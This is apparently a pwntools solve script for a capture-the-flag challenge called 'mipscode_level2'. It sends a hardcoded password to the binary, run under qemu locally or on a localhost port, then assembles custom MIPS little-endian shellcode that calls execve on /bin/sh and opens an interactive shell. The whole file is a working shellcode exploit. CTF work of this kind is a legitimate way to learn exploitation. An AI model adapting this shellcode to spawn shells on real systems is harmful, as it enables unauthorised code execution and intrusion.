from pwn import *


pwd = b'8ff28f88f91b8f93006ed39cba6217e2860cb2c004eb490a1b16aeb2948164d6'


#binary = "/ctf/mipscode_level2"
binary = "src/app/mipscode_level2"
elf = context.binary = ELF(binary, checksec=False)
#qemu = ELF('/ctf/qemu-mipsel',checksec=False)
qemu = ELF('src/app/qemu-mipsel',checksec=False)

if args.REMOTE:
    #p = remote("localhost", 1337)
    p = remote("localhost", 40005)
else:
    #p = qemu.process(['-g','1234','/ctf/mipscode_level2'])
    p = qemu.process(['-g','1234','src/app/mipscode_level2'])



### PUT IN PASSWORD ###
p.sendline(pwd)


### GENERATE SHELLCODE ###
context.update(arch='mips', os='linux', bits=32, endian='little')
shellcode = asm('''
    bltzal  $zero, getpc
getpc:
    addiu   $v0, $zero, 0xfab
    slti    $a2, $zero, -1
    slti    $a1, $zero, -1
    addiu   $a0, $ra, 0x101
    addiu   $t4, $a0, -0xdd
    sb      $a2, -1($t4)
    addiu   $a0, $a0, -0xe5
    syscall 0x040405
    .word   0x6e69622f
    .word   0x6168732f
''')
shellcode = b'\xff\xff'+shellcode[2:]

print(f"Shellcode: {shellcode}")
print(f"Shellcode length: {len(shellcode)}")


### EXPLOIT ###
p.sendline(shellcode)
p.interactive()